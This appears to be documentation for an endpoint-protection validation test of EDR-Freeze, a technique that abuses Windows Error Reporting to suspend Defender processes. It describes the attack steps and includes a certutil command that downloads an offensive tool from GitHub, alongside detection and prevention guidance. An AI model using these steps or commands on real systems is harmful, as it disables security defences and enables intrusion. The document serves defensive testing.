## Overview
This test evaluates endpoint protection capabilities against EDR-Freeze, a sophisticated defense evasion technique that exploits Windows Error Reporting (WerFaultSecure.exe) to suspend security processes without requiring vulnerable drivers (BYOVD). The technique operates entirely in user mode and works on the latest Windows versions including Windows 11 24H2.

## Technique Details

  - T1055 (Process Injection - indirect via WerFaultSecure)
  - T1574 (Hijack Execution Flow)
- **Tactic**: Defense Evasion
- **Platform**: Windows (tested on Windows 11 24H2)
- **Permissions Required**: User
- **Category**: Security Test, Defense Evasion, Process Manipulation

## Technical Mechanism

### How EDR-Freeze Works
EDR-Freeze exploits a race condition in the Windows Error Reporting system:

1. **MiniDumpWriteDump Behavior**: When WerFaultSecure.exe creates a memory dump of a process, it uses MiniDumpWriteDump which suspends all threads in the target process during the dump operation.

2. **PPL Exploitation**: The tool uses CreateProcessAsPPL to launch WerFaultSecure.exe with WinTCB (Windows Trusted Computing Base) protection level, allowing it to interact with Protected Process Light (PPL) processes.

3. **Race Condition Attack**:
   - WerFaultSecure is launched with parameters to dump a target security process (e.g., MsMpEng.exe)
   - The tool monitors for when the target becomes suspended
   - Immediately upon detecting suspension, it suspends WerFaultSecure itself
   - This keeps the target process in a perpetual "coma state" since WerFaultSecure never completes its operation

4. **Timed Release**: After a specified duration (60 seconds in this test), WerFaultSecure is terminated, allowing the target process to automatically resume.

## Test Description
The test performs the following sequence:

1. **Initial Setup**
   - Drops EDR-Freeze.exe to C:\F0
   - Waits 3 seconds to observe defensive reactions
   - Checks if the binary was quarantined

2. **Target Identification**
   - Searches for active Windows Defender processes in priority order:
     - MpDefenderCoreService.exe (Windows 11 core service)
     - MsMpEng.exe (main antimalware engine)
     - NisSrv.exe (Network Inspection Service)
   - Extracts the PID of the first found process

3. **Attack Execution**
   - Executes: `EDR-Freeze.exe <defender_pid> 60000`
   - This suspends the Defender process for 60 seconds
   - Waits 5 seconds for suspension to take effect

4. **Validation Phase**
   - Attempts to download a known malicious tool (Seatbelt.exe) using certutil:
     ```
     certutil.exe -urlfetch -verifyctl https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x86/Seatbelt.exe
     ```
   - If Defender is truly suspended, this download will succeed
   - If Defender is still active, it will block the malicious download

## Expected Behaviors

### Detection Opportunities
Security solutions should detect:
- **File-Based Detection**:
  - EDR-Freeze.exe signature or heuristic patterns
  - Known malicious tool signatures (Seatbelt.exe)

- **Behavioral Detection**:
  - WerFaultSecure.exe launched with suspicious parameters pointing to security process PIDs
  - Unusual process creation chains involving WerFaultSecure
  - Thread suspension patterns in security processes
  - Security process threads remaining suspended for extended periods
  - Certutil.exe downloading executables from known malicious repositories

- **Process Manipulation Detection**:
  - CreateProcessAsPPL usage to create PPL processes
  - Manipulation of Windows Error Reporting components
  - Attempts to interact with protected security processes

### Prevention Mechanisms
Activities should be blocked at one or more stages:
- **Stage 1**: File quarantine of EDR-Freeze.exe on extraction
- **Stage 2**: Execution prevention of EDR-Freeze.exe
- **Stage 3**: Prevention of security process manipulation
- **Stage 4**: Blocking of malicious file download via certutil

### Alerting
Security alerts should be generated for:
- Defense evasion technique detection
- Security process manipulation attempts
- Abuse of legitimate Windows components (WerFaultSecure.exe)
- Malicious tool download attempts
- Process suspension anomalies

## Limitations and Considerations
- **Timing Sensitivity**: Requires precise timing to suspend WerFaultSecure after target suspension
- **Process Availability**: Requires target security process to be running
- **Temporary Nature**: Defense bypass is temporary (configurable duration)
- **Detection Surface**: Multiple behavioral indicators provide detection opportunities
- **Windows Version**: Tested on Windows 11 24H2, may behave differently on other versions

## Real-World Implications
This technique demonstrates:
- The abuse of legitimate Windows components for malicious purposes
- Limitations of signature-based detection alone
- Importance of behavioral detection for process manipulation
- Need for monitoring of Windows Error Reporting component usage
- Value of detecting security process anomalies
